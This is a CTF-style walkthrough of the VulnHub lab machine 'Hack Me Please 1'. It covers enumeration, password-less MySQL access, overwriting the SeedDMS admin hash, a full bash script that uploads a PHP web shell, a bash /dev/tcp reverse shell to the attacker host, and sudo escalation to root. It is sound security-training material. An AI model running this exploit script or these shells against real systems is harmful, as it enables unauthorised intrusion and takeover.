---
title: VulnHub - Hack Me Please 1
author: ret2x
date: 2022-06-10 17:11:27 +0800
categories: [Walkthrough, VulnHub]
tags: [vulnhub, rce]
image:
    path: /assets/images/hackmeplease/front.png
---

**Description:** A linux machine that requires to enumerate the MySQL service and exploiting a Remote Command Execution. Exposed credentials granted root privileges.

**Author:** Saket Sourav

**Operating System:** Linux

**Download:** [https://www.vulnhub.com/entry/hack-me-please-1,731/](https://www.vulnhub.com/entry/hack-me-please-1,731/)

## Information Gathering
### Host Discovery

We located the target machine with a ping scan, the script can be found [here](https://github.com/ret2x-tools/ping-scan.git)

```console
root@kali:~$ ping-scan.py -r 172.16.131.0/24
172.16.131.131  is up
```

### Port Scanning

The following full TCP port scan discovered three available ports.

```console
root@kali:~$ nmap -n -v -T5 -p- 172.16.131.131 -oG nmap/all-tcp-ports.txt
...
PORT      STATE SERVICE
80/tcp    open  http
3306/tcp  open  mysql
33060/tcp open  mysqlx
```

### Service Enumeration

In order to detect the services and versions of the open ports, an aggressive scan was performed.

```console
root@kali:~$ nmap -n -v -A -p80,3306,33060 -Pn 172.16.131.131 -oG nmap/service-enum.txt
...
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Welcome to the land of pwnland
|_http-server-header: Apache/2.4.41 (Ubuntu)
3306/tcp  open  mysql   MySQL 8.0.25-0ubuntu0.20.04.1
|_sslv2: ERROR: Script execution failed (use -d to debug)
| mysql-info:
|   Protocol: 10
|   Version: 8.0.25-0ubuntu0.20.04.1
|   Thread ID: 37
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, LongColumnFlag, LongPassword, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SwitchToSSLAfterHandshak
e, DontAllowDatabaseTableColumn, ODBCClient, FoundRows, InteractiveClient, SupportsTransactions, SupportsLoadDataLocal, Speaks41ProtocolOld, IgnoreSigpipes, Support
sCompression, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: vy\x19\x02tK\x1Alx\x15hz\x01@\x7FO#R\x07<
|_  Auth Plugin Name: caching_sha2_password
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
33060/tcp open  mysqlx?
```

### Web Enumeration

As we see the website did not reveal much.

![](/assets/images/hackmeplease/screenshot-1.png)

Likewise, directory enumeration did not find anything either.

```console
root@kali:~$ gobuster dir -u http://172.16.131.131/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html -e
...
http://172.16.131.131/index.html           (Status: 200) [Size: 23744]
http://172.16.131.131/img                  (Status: 301) [Size: 314] [--> http://172.16.131.131/img/]
http://172.16.131.131/css                  (Status: 301) [Size: 314] [--> http://172.16.131.131/css/]
http://172.16.131.131/js                   (Status: 301) [Size: 313] [--> http://172.16.131.131/js/]
http://172.16.131.131/fonts                (Status: 301) [Size: 316] [--> http://172.16.131.131/fonts/]
http://172.16.131.131/server-status        (Status: 403) [Size: 279]
```

Then I tried to download the web page to analyze it further.

```console
root@kali:~$ wget -r http://172.16.131.131
```

Searching for comments in the **main.js** javascript file found a directory path.

```console
root@kali:~$ grep -or '//.*' 172.16.131.131/js/main.js | sed -n '17p'
//make sure this js file is same as installed app on our server endpoint: /seeddms51x/seeddms-5.1.22/
```

We browsed to this directory and it redirected us to login page.

![](/assets/images/hackmeplease/screenshot-2.png)

Looking for vulnerabilities in that version of **seeddms5.1.22**, there is a remote code execution vulnerability, but it does not match with this specific version.

```console
root@kali:~$ searchsploit seeddms
----------------------------------------------------------------------- --------------------------------
Exploit Title                                                          |  Path
----------------------------------------------------------------------- --------------------------------
Seeddms 5.1.10 - Remote Command Execution (RCE) (Authenticated)        | php/webapps/50062.py
SeedDMS 5.1.18 - Persistent Cross-Site Scripting                       | php/webapps/48324.txt
SeedDMS < 5.1.11 - 'out.GroupMgr.php' Cross-Site Scripting             | php/webapps/47024.txt
SeedDMS < 5.1.11 - 'out.UsrMgr.php' Cross-Site Scripting               | php/webapps/47023.txt
SeedDMS versions < 5.1.11 - Remote Command Execution                   | php/webapps/47022.txt
----------------------------------------------------------------------- --------------------------------
```

### Mysql Enumeration

I then decided to try to login via mysql without password as user **seeddms**, there is a database called the same as the username, so I switched to it.

```console
root@kali:~$ mysql -h 172.16.131.131 -u seeddms -p
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| seeddms            |
| sys                |
+--------------------+
5 rows in set (0.416 sec)

MySQL [(none)]> use seeddms;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

In the **seeddms** database there are two tables that look interesting.

```console
MySQL [seeddms]> show tables;
...
| tblUsers                     |
...
| users                        |
+------------------------------+
```

Retrieving the content of the table **users**, we see that there is a register.

```console
MySQL [seeddms]> select *from users;
+-------------+---------------------+--------------------+-----------------+
| Employee_id | Employee_first_name | Employee_last_name | Employee_passwd |
+-------------+---------------------+--------------------+-----------------+
|           1 | saket               | saurav             | Saket@#$1337    |
+-------------+---------------------+--------------------+-----------------+
```

Retrieving the content of the table **tblUsers**, we see that there are two registers.

```console
MySQL [seeddms]> select login,pwd from tblUsers;
+-------+----------------------------------+
| login | pwd                              |
+-------+----------------------------------+
| admin | f9ef2c539bad8a6d2f3432b6d49ab51a |
| guest | NULL                             |
+-------+----------------------------------+
```

I tried to log in as user **saket** on the web page but it was unsuccessfull, then I was not possible try to crack the MD5 hash, so I decided to update the password hash for another one.


```console
MySQL [seeddms]> update tblUsers set pwd = md5('hackm3') where id = 1;
Query OK, 1 row affected (0.093 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MySQL [seeddms]> select id,login,pwd from tblUsers;
+----+-------+----------------------------------+
| id | login | pwd                              |
+----+-------+----------------------------------+
|  1 | admin | 943ba3c219cc4dd8ef157a925f738a73 |
|  2 | guest | NULL                             |
+----+-------+----------------------------------+
2 rows in set (0.003 sec)
```

## Exploitation
### Remote Command Execution

So I was able to log in as **admin** to the web application.

![](/assets/images/hackmeplease/screenshot-3.png)

![](/assets/images/hackmeplease/screenshot-4.png)

I exploited the remote command execution with a bash script created by my own, as the python script had some problems.

```bash
#!/bin/bash

if [ $# -ne 3 ]; then
    echo "Usage: $(basename $0) [url] [user] [password]"
    exit
fi

url=$1
user=$2
passwd=$3
check="password incorrect"
webshell="<?php passthru(\$_REQUEST['cmd']); ?>"

# Login to SeedDMS
r=$(curl -sL -X POST -c cookies.txt "${url}/op/op.Login.php" \
    --data "login=$user&pwd=$passwd&lang=en_GB" | grep -o "$check")

if [ -z "$r" ]; then
    echo "[+] Login successful"
else
    echo "[-] Incorrect credentials"
    exit
fi

# Retrieving token
formtoken=$(curl -s -L -b cookies.txt "${url}/out/out.AddDocument.php?folderid=1&showtree=1" \
    | grep -oP '"\S{32}"' | cut -d '"' -f 2)

if [ -n $formtoken ]; then
    echo "[+] Token retrieved"
else
    echo "[-] Could'n retrieve the token"
    exit
fi

# Creating web shell
echo "[+] Creating web shell"
file=/tmp/z.php
echo $webshell > $file

# Uploading the payload
randname=$(echo $RANDOM | base64)

upload=$(curl -s -X POST -b cookies.txt "${url}/op/op.AddDocument.php" \
    -F "formtoken=$formtoken" \
    -F "folderid=1" \
    -F "showtree=1" \
    -F "name=$randname" \
    -F "comment=" \
    -F "keywords=" \
    -F "sequence=2" \
    -F "presetexpdate='never'" \
    -F "expdate=" \
    -F "ownerid=1" \
    -F "reqversion=1" \
    -F "userfile[]=@$file" \
    -F "version_comment=") 

if [ $? -eq 0 ]; then
    echo "[+] Webshell uploaded"
    rm $file
else
    echo "[+] Ocurred an error uploading web shell"
    exit
fi

# Searching webshell
file_id=$(curl -sL -b cookies.txt "$url/out/out.Search.php?folderid=1&navBar=1&query=$randname" \
    | grep -oP 'target-id=".*?"' | cut -d '"' -f 2)

# Executing webshell
if [ -n "$file_id" ]; then
    echo -e "[+] Getting shell\n"
    while echo -n "\$ "; read command; do
        if [ "$command" = "exit" ]; then
            exit
        fi
        curl -sL -b cookies.txt "$url/../data/1048576/$file_id/1.php?cmd=$(php -r "echo urlencode('$command');")" 
    done 
else
    echo "[-] Couldn't run webshell"
    exit
fi
```

I granted execute permissions and executed the script adding the username and password as parameters.

```console
root@kali:~$ chmod +x poc.sh
root@kali:~$ ./poc.sh
Usage: poc.sh [url] [user] [password]
root@kali:~$ ./poc.sh http://172.16.131.131/seeddms51x/seeddms-5.1.22 admin hackm3
[+] Login successful
[+] Token retrieved
[+] Creating web shell
[+] Webshell uploaded
[+] Getting shell

$ whoami
www-data
$ cat /etc/issue
Ubuntu 20.04.2 LTS \n \l
```

We see that we can execute system commands, but this is a limited shell, we can not do much, so I decided to get a reverse shell, for that we set up a netcat listener on port 443 and then we run the following bash reverse shell.

```console
$ bash -c "bash -i >& /dev/tcp/172.16.131.1/443 0>&1"
```

We get a reverse shell, and the we spawn to a full tty shell.

```console
root@kali:~$ nc -vlnp 443
listening on [any] 443 ...
connect to [172.16.131.1] from (UNKNOWN) [172.16.131.131] 38042
bash: cannot set terminal process group (935): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/seeddms51x/data/1048576/163$ script -qc /bin/bash /dev/null
<1x/data/1048576/163$ script -qc /bin/bash /dev/null
www-data@ubuntu:/var/www/html/seeddms51x/data/1048576/163$ ^Z
zsh: suspended  nc -vlnp 443
root@kali:~$ stty raw -echo; fg
[1]  + continued  nc -vlnp 443

www-data@ubuntu:/var/www/html/seeddms51x/data/1048576/163$ export TERM=screen
164  ata@ubuntu:/var/www/html/seeddms51x/data/1048576/163$ stty rows 44 columns
```

## Privilege Escalation
### Exposed Credentials 

Then, to elevate the access level as user **saket** I used the password found in the table users.

password: Saket@#$1337

```console
www-data@ubuntu:/var/www/html$ su saket
Password:
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

saket@ubuntu:/var/www/html$ cd
saket@ubuntu:~$ whoami
saket
```

We can see that **saket** can execute commands with sudo privileges.

```console
saket@ubuntu:/var/www$ sudo -l
[sudo] password for saket:
Matching Defaults entries for saket on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User saket may run the following commands on ubuntu:
    (ALL : ALL) ALL
saket@ubuntu:~$
```

### Sudo Permissions

We run the **su** command followed by a hyphen as sudo and we get root.

```console
saket@ubuntu:/var/www/html$ sudo su -
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
```
